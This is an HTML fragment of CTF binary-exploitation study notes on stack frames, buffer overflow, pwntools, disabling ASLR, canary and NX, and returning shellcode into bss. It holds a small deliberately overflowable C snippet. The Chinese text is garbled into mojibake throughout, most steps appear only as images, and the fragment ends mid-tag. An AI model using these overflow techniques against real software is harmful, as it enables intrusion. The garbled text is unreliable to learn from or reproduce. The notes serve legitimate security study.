/><p>Linuxç¯å¢ƒä¸‹æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶<br>!xdd%-r è¿˜åŸæ–‡ä»¶<br>rm a.out åˆ é™¤<br>.&#x2F;a.out æ˜¯linux&#x2F;unixç¯å¢ƒä¸‹gccç¼–è¯‘æºä»£ç (c&#x2F;c++)å¹¶è¿æ¥æ¥äº§ç”Ÿçš„é»˜è®¤æ‰§è¡Œæ–‡ä»¶åã€‚.&#x2F;a.outè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹çš„a.outæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p><p>é“¾æ¥<br>åŠ¨æ€é“¾æ¥ï¼šprintfçš„ä»£ç åˆ°åŠ¨æ€é“¾æ¥åº“é‡Œï¼›<br>é™æ€é“¾æ¥ï¼šprintfä¸­çš„ä»£ç ç›´æ¥å†™å¥½åœ¨å¯¹åº”æ–‡ä»¶ä¸­<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>æ–‡ä»¶æƒé™ä¸å¤Ÿæ—¶å¦‚ä½•å¤„ç†å¾—åˆ°shell</strong><br>ä¸‹ä»¥python3ä¸ºä¾‹</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p><p>mvå‘½ä»¤ï¼šç”¨æˆ·å¯ä»¥ä½¿ç”¨mvå‘½ä»¤æ¥ä¸ºæ–‡ä»¶æˆ–ç›®å½•æ”¹åæˆ–å°†æ–‡ä»¶ç”±ä¸€ä¸ªç›®å½•ç§»å…¥å¦ä¸€ä¸ªç›®å½•ä¸­ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p><p>æ®µç”¨æ¥æ ‡æ³¨è¿›ç¨‹ã€å°è±¡ä»£ç æ®µæƒé™ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p><p>.&#x2F;æ—¶æ‰è¢«è¯»å…¥å†…å­˜<br>cacheè¶Šå¤§ï¼ˆMå­˜å‚¨ï¼‰ï¼Œcpué€Ÿåº¦è¶Šå¿«ã€‚</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p><p>å®æ¨¡å¼ä¸‹è¿è¡Œï¼ˆæ˜“å—åˆ°æ”»å‡»ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p><p>åå…­è¿›åˆ¶è½¬äºŒè¿›åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" alt="image-20230208173818672"></p><p>Cè¯­è¨€å‡½æ•°æ ˆå¸§<br>æ ˆå¸§ï¼šè®°å½•ä¸€ä¸ªå‡½æ•°æ­¤æ—¶çš„çŠ¶æ€ä¿¡æ¯<br>å‡½æ•°çš„æ ˆåº•ç”±EBPæˆ–RBPä¿å­˜<br>å‡½æ•°çš„æ ˆé¡¶ç”±ESPæˆ–RSPä¿å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p><p>32ä½è§†å›¾<br>å­å‡½æ•°æ‰€ç”¨å‚æ•°ä¿å­˜åœ¨çˆ¶å‡½æ•°æ ˆå¸§çš„æœ«å°¾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p><p>push ebpä¿æŒçˆ¶å‡½æ•°æ ˆåº•çš„ç©ºé—´<br>sumå‡½æ•°è°ƒç”¨å®Œåéœ€è¦æ¢å¤mainå‡½æ•°çš„ä¿¡æ¯ï¼Œå³åœ¨è°ƒç”¨sumå‡½æ•°å‰éœ€å°†mianå‡½æ•°æ ˆåº•å‹å…¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p><p>æ ˆçš„æ ˆé¡¶ä¸€å®šæ˜¯å½“å‰æ‰§è¡Œå‡½æ•°æ‰€å±çš„æ ˆå¸§ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p><p>æ— éœ€èˆå¼ƒåªéœ€æ ‡è®°ä¸ºä¸éœ€ä½¿ç”¨å€¼å³å¯â€”â€”&gt;æ‰©å¤§espåˆ°ebpå¤„ï¼ˆé¿å¼€å±€éƒ¨å˜é‡å­˜å‚¨ç©ºé—´ï¼‰<br><strong>æ³¨æ„ï¼šæ­¤è¿‡ç¨‹ä¸­å˜åŒ–ä¸ºå¯¹åº”å€¼çš„åœ°å€å­˜å‚¨åœ¨ebpä¸­â€”â€”&gt;å¯¹åº”å€¼å­˜å‚¨åœ¨ebpä¸­</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p><p>ebpå‡å°ä¸€ä¸ªå­—é•¿ï¼›espåŠ ä¸€ä¸ªå­—é•¿ã€‚é€šè¿‡returnæŒ‡ä»¤å°†return addresså¼¹å‡ºä¿å­˜åœ¨eapï¼ˆæŒ‡ä»¤å¯„å­˜å™¨ï¼‰ä¸­<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p><p>callæŒ‡ä»¤è‡ªå¸¦ä¿å­˜è¿”å›åœ°å€ã€‚<br>leaveï¼šå°†esp ebpæ”¾äºåŒä¸€ä½ç½®åpopebpã€‚<br>popæ€»æ˜¯å°†espæŒ‡å‘çš„å€¼å¯¹åº”çš„1å­—é•¿æ•°æ®ä¼ å…¥åˆ°ç›®æ ‡ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p><p><strong>ç¼“å†²åŒºæº¢å‡ºä¸­</strong> <strong>æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæµæ ¸å¿ƒï¼š</strong><br>å½“å­å‡½æ•°è¿”å›çˆ¶å‡½æ•°æ—¶ä¼šå°†<em>Ruturn Adress</em>ä¸­çš„å€¼è¿”å›åˆ°PCå¯„å­˜å™¨eipï¼ˆ32ä½ï¼‰ä¸­ï¼Œå½“eipä¸­å€¼å†™å…¥ç›®æ ‡å€¼çš„åœ°å€ï¼Œæ—¢å¯<em>å®Œæˆç¨‹åºæ‰§è¡Œæµçš„æ§åˆ¶</em>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p><p>ä¸¾ä¾‹æ¼”ç¤ºï¼š<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p><pre><code class="c">#include&lt;stdio.h&gt;int main()&#123;   char str[8];   read (0,str,24);   retrun 0;&#125;</code></pre><p>æ­¤æ—¶äº§ç”Ÿsegmentation faultï¼ˆæ®µé”™è¯¯ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p><p>å®‰å…¨ä¿æŠ¤æªæ–½ï¼ˆæ‹¿åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹åå…ˆæ£€æŸ¥ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p><p><strong>æ³¨æ„</strong>ï¼š<em>å‡ºç°getså‡½æ•°å¿…æœ‰æ ˆæº¢å‡ºï¼</em>strartå‡½æ•°æ— æ³•F5ï¼ˆç¼–å†™æ—¶å·²ç”¨æ±‡ç¼–ä»£ç å®ç°ï¼‰<br>vulnerableâ€”â€”&gt;å¯æ€œå—å®³è€…å‡½æ•°æ~</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p><p>ctrl+Aåï¼šå¯çœ‹Cå’Œæ±‡ç¼–æ¯”è¾ƒ<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p><p>ctrl+sâ€“&gt;ä¿å­˜<br>(Fn+)shift+F12-&gt;æ‰“å¼€å­—ç¬¦ä¸²ç•Œé¢ï¼ˆASCIIèŒƒå›´å†…çš„å­—ç¬¦ä¸²ï¼‰<br>æ‰“å¼€ç›®æ ‡æ–‡ä»¶å¾—å…³é”®å¥é€å±‚å‰–æåæ±‡ç¼–getå®Œæ•´mainä½“-&gt;end<br>pwntools:ncè½¬åˆ°é—®é¢˜å˜é‡æœ¬ä½“<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p><p>CTFå»ºè®®ï¼špip2+pip3å‡å®‰è£…<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>ä»£ç†åœ°å€å¯è¿›è¡Œå®‰è£…</strong>vi</p><p>æ‹¿åˆ°é¢˜ç›®â€”â€”&gt;å…ˆæ‹¿åˆ°æœ¬åœ°shellâ€”â€”&gt;pwntoolsæ”»å‡»â€”â€”&gt;ioæœ¬åœ°åˆ‡æ¢ä¸ºè¿œç¨‹ï¼ˆè„šæœ¬ä¸å˜ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p><p>é“¾æ¥ï¼šprocess()-&gt;æœ¬åœ°ï¼›remoteï¼ˆï¼‰â€”&gt;è¿œç¨‹<br>å‡½æ•°ï¼š<br>io.recvline() æ¥æ”¶ä¸€è¡Œå­—ç¬¦ä¸²ï¼›           io.recvï¼ˆï¼‰æ¥æ”¶å¤šè¡Œå­—ç¬¦ä¸²<br>io.send() <strong>æ³¨æ„ï¼šå‡½æ•°å†…éƒ¨åªèƒ½ä¸ºå­—èŠ‚æµï¼ˆå³ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºï¼‰</strong><br>io.send(p32(0)+bâ€ â•°(<em>Â°â–½Â°</em>)â•¯â€”â€”&gt;è¡¨ç¤ºbiteå¯¹è±¡â€)<br>io.sendline()â€”â€”&gt;ä¸€ç›´è¯»å–ç›´åˆ°\0æˆ–\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p><p>nc toolsåœ°å€ â—â—â—flagéšè—åœ¨å…¶ä¸­â—â—â—<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p><p>python3å¼€  remote(â€œipâ€,ç«¯å£)<br>ç‰¹æ®Šæ§åˆ¶ç¬¦\râ€”â€”&gt; è¾“å‡ºå½“å‰è¡ŒåæŒç»­è¿›è¡Œæ¸…ç©º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p><p>base64å·¥å…·ï¼ˆpwntoolså·¥å…·ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p><p>â—BASE64:åŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰,å°å†™å­—æ¯ï¼ˆa-zï¼‰ï¼Œæ•°å­—ï¼ˆ0-9ï¼‰ä»¥åŠ+&#x2F; ä¸€èˆ¬å¸¦&#x3D;&#x3D;<br>â—BASE32:åªæœ‰å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰å’Œæ•°å­—234567 ä¸€èˆ¬å¸¦&#x3D;&#x3D;&#x3D;<br>â—BASE16å³ä¸º16è¿›åˆ¶<br><strong>å½“ASCllç”¨BaseåŠ å¯†è¾¾ä¸åˆ°æ‰€å¯¹åº”çš„ä½æ•°çš„æ—¶å€™ç”¨&#x3D;å·è¡¥é½</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p><blockquote><p>cd â€œä½ æƒ³è¦è¿›çš„ç›®å½•â€ &#x2F;&#x2F;å½“ç›®å½•åç§°ä¸­å«æœ‰ç©ºæ ¼ã€ä¸­æ–‡æˆ–å…¶å®ƒ<a href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">ç‰¹æ®Šå­—ç¬¦</a>æ—¶è¯·ç”¨<a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">åŒå¼•å·</a>åŒ…æ‹¬</p><p>ä»¥ä¸‹æ˜¯æœ€å¸¸ç”¨çš„å‡ ä¸ªç›®å½•çš„å†™æ³•ï¼š</p><p>&#x2F; ä»£è¡¨<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">æ ¹ç›®å½•</a></p><p>. å½“å‰ç›®å½•</p><p>.. ä¸Šçº§ç›®å½•</p><p>~ å½“å‰ç”¨æˆ·çš„é»˜è®¤å·¥ä½œç›®å½•</p><p>ç›®å½•å¯ä»¥çœç•¥ä¸å†™ï¼Œ ä¸cd ~ æœ‰ç›¸åŒçš„æ•ˆæœ</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p><p>å…³é—­æ ‡å‡†è¾“å…¥è¾“å‡ºçš„ç¼“å†²åŒº ä½¿å¾—å…¶ä¸­å†…å®¹å¯ä»¥ç«‹é©¬æ˜¾ç¤ºå‡ºæ¥ ctrl+#è°ƒå°å­—ä½“<br>ä¸‹æ–­ç‚¹æ–¹å¼ï¼špwndbgä¸­b *+ä¸€ä¸ªåœ°å€ æˆ–è€…b + ä¸€ä¸ªå‡½æ•°<br>å…ˆä¸‹æ–­ç‚¹årun  gdbä¸­è¿è¡Œè¾“å…¥é¦–å­—æ¯å³å¯  ä¾‹ï¼šnâ€”â€”&gt;æ­¥è¿‡    sâ€”â€”&gt;standin<br>ä¸‹æ–­ç‚¹ï¼šbï¼ˆbreakpointï¼‰  * +åœ°å€&#x2F;å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p><p>æ­¤æ—¶å¯ä¿®æ”¹éƒ¨åˆ†ä¸ºbufferï¼ˆ8å­—èŠ‚ï¼‰å³eaxåˆ°ebpéƒ¨åˆ†ï¼ˆ16å¤§å°ï¼‰è¦†ç›–æ—¶éœ€+4ï¼ˆè¦†ç›–ebpï¼‰<br>æŒç»­å‘ä¸‹å†™<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">æ‰¾åˆ°åé—¨å‡½æ•°system æ³¨ï¼šå¯ä¸æ˜¯æ¬¡æ¬¡è¿™ä¹ˆä¾¿å®œçš„å“¦ğŸ¤£<br>syetemè¿”å›å­—ç¬¦ä¸²&#x3D;åœ¨shellä¸­ç›´æ¥æ‰§è¡Œå­—ç¬¦ä¸² pwdï¼šæ‰“å°å·¥ä½œç›®å½•<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p><p>ä½¿å¾—vualable returnåˆ°shellå³å¯<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p><p>pï¼ˆpackï¼‰å¯¹æ•°æ®è¿›è¡Œæ‰“åŒ…å˜ä¸ºå­—ç¬¦å‹æ•°æ® ï¼› ä¾‹ï¼šp32ï¼ˆ0x8048522ï¼‰æ‰“åŒ…ä¸º32biteä½å­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p><p>gccï¼šLinuxç¯å¢ƒä¸‹çš„ä¸€æ¬¾ç¼–è¯‘å™¨ã€‚<br>ctrl+d é€€å‡ºpythonäº¤äº’ç¯å¢ƒ!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bssé»˜è®¤æ ˆå¯æ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>å…³é—­éšæœºåŒ–ï¼ˆASLRï¼‰</p><pre><code>-fro-stack-protector å…³é—­canary-z exexstack æ‰“å¼€æ ˆçš„å¯æ‰§è¡Œæƒé™-no-pie å…³é—­pieï¼ˆç¨‹åºç¼–è¯‘æ—¶æ‰“å¼€pie å°†åœ°å€éšæœºåŒ–ä¸ºæ— å…³ä»£ç  å³éšæœºåŒ–elfæ–‡ä»¶ï¼‰-g å¸¦ä¸Šè°ƒè¯•ä¿¡æ¯ è°ƒè¯•æ—¶å¯ä»¥çœ‹è§æºä»£ç ï¼ˆret2stack.cæœªåˆ é™¤æƒ…å†µä¸‹ï¼‰-o è¾“å‡ºç›®æ ‡æ–‡ä»¶</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x ç»™æƒé™<br>shellcode(åç§»+è¿”å›åœ°å€)</p><p>åœ°å€ç©ºé—´éšæœºåŒ–&lt;â€”â€”æ“ä½œç³»ç»Ÿå®ç°  å¯è¾“å…¥0æ£€æŸ¥ASLRæ˜¯å¦å…³é—­<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p><p>åŠ¨æ€é“¾æ¥åº“çœ‹ä¸º1 åœ°å€éšæœºåˆ†é… æ ˆåŒï¼ˆåç§»å€¼éšæœºåœ°å€æœªçŸ¥ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p><p>bssç”¨æ¥å­˜æ”¾å…¨å±€å˜é‡  å¯è¯»å¯å†™å¯æ‰§è¡Œ shellcodeè¿”å›åˆ°bss<br>shellcodeè¿”å›æ ˆåŒºç”±äºaslrçš„ä¿æŠ¤ä¸å¯å¾—åˆ°æ‰€éœ€æ ˆåœ°å€ï¼Œè¿”å›bsså³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p><p>åœ¨pwné‡Œï¼Œä¿æŠ¤ä¸€å…±æ˜¯å››ç§åˆ†åˆ«æ˜¯RELROã€Stackã€NXã€PIEã€‚<br>1.RELROï¼ˆReLocation Read-Onlyï¼‰ï¼šåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æƒ…å†µæ˜¯Partial RELROï¼Œè¿™ç§æƒ…å†µæ˜¯éƒ¨åˆ†å¼€å¯å †æ ˆåœ°å€éšæœºåŒ–ï¼Œgotè¡¨å¯å†™ï¼Œç¬¬äºŒç§ï¼ŒFull RELROæ˜¯å…¨éƒ¨å¼€å¯ï¼Œgotè¡¨ä¸å¯å†™ï¼ŒGotè¡¨æ˜¯å…¨å±€åç§»è¡¨ï¼Œé‡Œé¢åŒ…å«çš„æ˜¯å¤–éƒ¨å®šä¹‰çš„ç¬¦å·ç›¸åº”çš„æ¡ç›®çš„æ•°æ®æ®µä¸­ï¼ŒPLTè¡¨ï¼Œæ˜¯è¿‡ç¨‹é“¾æ¥è¡¨&#x2F;å†…éƒ¨å‡½æ•°è¡¨ï¼Œlinuxå»¶è¿Ÿç»‘å®šï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è¦è¿æ¥åˆ°Gotï¼ŒPLTè¡¨åªæ˜¯ä¸ºä¸€ä¸ªè¿‡æ¸¡çš„ä½œç”¨ã€‚<br>2.Stackï¼ˆcanaryï¼‰ï¼šè¿™ä¸ªä¿æŠ¤å…¶å®å°±æ˜¯åœ¨ä½ è°ƒç”¨çš„å‡½æ•°çš„æ—¶å€™ï¼Œåœ¨æ ˆå¸§ä¸­æ’å…¥ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œæˆè¿”å›ä¹‹å‰ï¼Œæ¥æ ¡éªŒéšæœºæ•°æ˜¯å¦è¢«æ”¹å˜ï¼Œæ¥åˆ¤æ–­æ˜¯å¦è¢«æ ˆæº¢å‡ºï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹Ÿä¿—ç§°ä¸ºcanaryï¼ˆé‡‘ä¸é›€ï¼‰ï¼Œæ ˆä¿æŠ¤æŠ€æœ¯ã€‚<br>3.NXï¼ˆno executeï¼‰ï¼šä¸ºæ ˆä¸å¯çŸ¥æ€§ï¼Œä¹Ÿå°±æ˜¯æ ˆä¸Šçš„æ•°æ®ä¸å¯ä»¥å½“ä½œä»£ç åŒºæ‰§è¡Œçš„ä½œç”¨,NXæ‰“å¼€è¯´æ˜æ ˆä¸Šå·²ç»ç»™å‡ºå…¨éƒ¨å¯ç”¨çš„systemï¼ˆï¼‰ã€â€&#x2F;bin&#x2F;shâ€ï¼Œä¸å¯è‡ªè¡Œå†™å…¥ã€‚<br>4.PIEï¼ˆPosition Independent Executableï¼‰ï¼šPIEçš„ä¸­æ–‡å«åšï¼Œåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯é’ˆå¯¹.textï¼ˆä»£ç æ®µï¼‰ï¼Œ.dataï¼ˆæ•°æ®æ®µï¼‰ï¼Œ.bssï¼ˆæœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼‰æ¥åšçš„ä¿æŠ¤ï¼Œæ­£å¸¸æ¯ä¸€æ¬¡åŠ è½½ç¨‹åºï¼ŒåŠ è½½åœ°å€æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯PIEä¿æŠ¤å¼€å¯ï¼Œæ¯æ¬¡ç¨‹åºå¯åŠ¨çš„æ—¶å€™éƒ½ä¼šå˜æ¢åŠ è½½åœ°å€ã€‚</p><p>context.arch &#x3D; â€˜â€œamch64â€â€”â€”&gt;å°†ä½æœºå™¨ç è½¬ä¸º64ä½<br>vmmapæ˜¾ç¤ºè™šæ‹Ÿå†…å­˜çš„åˆ†å¸ƒ<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p><p>32ä½ 1å­—é•¿&#x3D;4bite 64ä½ 1å­—é•¿ &#x3D; 8bite pushæ ˆå‘ä¸Šå¢é•¿popå‘ä¸‹å¢é•¿ï¼ˆå‡å°ï¼‰<br>leaveæ‰§è¡Œï¼š1.å°†espå½’ä½è‡³ebpä½  2.pop ebpå°†previous ebpä¸­çš„å€¼å­˜æ”¾åˆ°ebpä¸­ 3.ebpè¿”å›çˆ¶å‡½æ•°æ ˆåº•<br>espè‡ªåŠ¨+1å­—é•¿ï¼ˆæ‰§è¡Œpopï¼‰<br>returnçš„ä½œç”¨ï¼šå°†å½“å‰å‡½æ•°æ ˆé¡¶ä¸­çš„å€¼popè¿”å›åˆ°eipå¯„å­˜å™¨ä¸­ ç¨‹åºæ­£åœ¨æ‰§è¡Œçš„åœ°å€å˜æˆreturn address<br>return addressä¸­çš„å€¼å­˜æ”¾åˆ°eipä¸­ eipè¿”å›åˆ°ä¸Šä¸€ä¸ªå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p><p>pwndbgçš„å¥½å¤„æ~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>è‡ªåŠ¨ç¼–å†™payloadï¼ˆé»˜è®¤ç»“æœä¸ºx86ä¸‹32biteå¤§å°) printï¼ˆshellcraft.shï¼ˆ) )</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p><p>asmå°†æ±‡ç¼–ç è½¬å˜ä¸ºæœºå™¨ç åå‘é€è‡³è¿œç¨‹å†…å­˜è™šæ‹Ÿç©ºé—´çš„æŸä¸ªä½ç½®<br>l.just(xï¼Œy)ä»å·¦å‘å³ï¼Œå·¦ç«¯æ•°æ®ä¸å˜å¯¹å³è¾¹çš„æ•°æ®ä¸æ–­è¿›è¡Œå¡«å…… xï¼šå¡«å……çš„æ•°æ®é•¿åº¦ yï¼šå¡«å……å†…å®¹<br>cat.flag.txt å¾—åˆ°flagå†…å®¹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p><p>å…³é—­aslræŒ‡ä»¤ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p><p>å…³é—­canaryï¼ˆå †æ ˆå…±äº«åº“ï¼‰pie(å…±äº«åº“ç¼–è¯‘æ—¶ å°†elfæ–‡ä»¶æœ¬ä½“çš„è½½å…¥åœ°å€éšæœºåŒ–)  - 0è¾“å‡ºç›®æ ‡æ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p><p>ç»™å¯æ‰§è¡Œæ–‡ä»¶æƒé™ .&#x2F;è¿è¡Œshell<br>ctrl+c -&gt;å‘å½“å‰æ‰§è¡Œè¿›ç¨‹å‘é€ä¸€ä¸ªç»ˆæ­¢ä¿¡å·ï¼ˆå¤åˆ¶ctrl+shift+cï¼‰<br>crl+d é€€å‡ºå½“å‰shell<br>context.arch &#x3D; â€œamd64â€(å‘Šè¯‰pyç³»ç»Ÿæ¶æ„ã€ç³»ç»Ÿä½æ•°ã€‘)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">å…³é—­æ ‡å‡†ç¼“å†²åŒºå¾—åˆ°è¾“å‡ºå€¼</p><p>system()å‡½æ•°è°ƒç”¨&#x2F;bin&#x2F;shæ¥æ‰§è¡Œå‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œ&#x2F;bin&#x2F;sh ä¸€èˆ¬æ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼ŒæŒ‡å‘æŸä¸ªå…·ä½“çš„shellï¼Œæ¯”å¦‚bashï¼Œ-cé€‰é¡¹æ˜¯å‘Šè¯‰shellä»å­—ç¬¦ä¸²commandä¸­è¯»å–å‘½ä»¤ï¼› åœ¨è¯¥commandæ‰§è¡ŒæœŸé—´ï¼ŒSIGCHLDæ˜¯è¢«é˜»å¡çš„ï¼Œå¥½æ¯”åœ¨è¯´ï¼šhiï¼Œå†…æ ¸ï¼Œè¿™ä¼šä¸è¦ç»™æˆ‘é€SIGCHLDä¿¡å·ï¼Œç­‰æˆ‘å¿™å®Œå†è¯´ï¼› åœ¨è¯¥commandæ‰§è¡ŒæœŸé—´ï¼ŒSIGINTå’ŒSIGQUITæ˜¯è¢«å¿½ç•¥çš„ï¼Œæ„æ€æ˜¯è¿›ç¨‹æ”¶åˆ°è¿™ä¸¤ä¸ªä¿¡å·åæ²¡æœ‰ä»»ä½•åŠ¨ä½œ</p><p><img 